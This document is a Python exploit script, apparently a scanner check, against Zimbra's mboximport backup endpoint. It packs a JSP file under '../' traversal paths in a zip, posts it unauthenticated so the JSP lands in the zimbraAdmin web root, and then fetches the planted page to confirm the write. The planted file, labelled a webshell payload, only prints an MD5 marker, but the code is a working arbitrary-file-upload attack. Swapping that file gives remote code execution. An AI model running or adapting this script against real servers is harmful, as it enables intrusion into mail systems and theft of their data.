import requests,re,urllib3,base64,io
import zipfile

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def build_zip(jsp, path):
    zip_buffer = io.BytesIO()
    zf = zipfile.ZipFile(zip_buffer, 'w')
    zf.writestr(path, jsp)
    zf.close()
    return zip_buffer.getvalue()
webshell_payload='''<%@ page import="java.math.BigInteger"%>
<%@ page import="java.security.MessageDigest"%>
<%
 MessageDigest md5 = null;
 md5 = MessageDigest.getInstance("MD5");
 String s = "31415926"; 
 String miyao = "xray"; 
 String jiamichuan = s + miyao; 
 md5.update(jiamichuan.getBytes());
 String md5String = new BigInteger(1, md5.digest()).toString(16);
 out.println(md5String);
%>'''

def scan(baseurl):
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	webshell_name='YErP5Mj6IgVmRSrt.jsp'
	# path='../../../../mailboxd/webapps/zimbraAdmin/'
	paths = ['../../../../mailboxd/webapps/zimbraAdmin/','../../../../jetty_base/webapps/zimbraAdmin/','../../../../jetty/webapps/zimbraAdmin/']
	urlpath_list=['service/extension/backup/mboximport?account-name=admin&ow=2&no-switch=1&append=1','service/extension/backup/mboximport?account-name=valid_email&account-status=1&ow=cmd']
	total=[]
	for path in paths:
		for urlpath in urlpath_list:
			total.append((path,urlpath))

	flag=[]
	for t in total:
		path=t[0]
		urlpath=t[1]
		try:
			zippedfile = build_zip(webshell_payload, path+webshell_name)
			url=baseurl+f"{urlpath}"

			# body=""+zipfile+""
			headers={'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded'}
			response=requests.post(url=url,data=zippedfile,headers=headers,timeout=5,verify=False)

			if response.status_code == 401:
				r0=True
			else:
				r0=False
			if baseurl[-1]=="/":
				baseurl=baseurl
			else:
				baseurl=baseurl+"/"
			url=baseurl+"zimbraAdmin/YErP5Mj6IgVmRSrt.jsp"
			headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
			response=requests.get(url,headers=headers,timeout=5,verify=False)
			if response.status_code == 200 and "7f8c3c909499a264c5d020e309e4ee99" in response.text:
				r1=True
			else:
				r1=False
			if r0 and r1:
				flag.append(1)
				break
		except:
			pass
	if len(flag)>0:
		return True
	else:
		return False
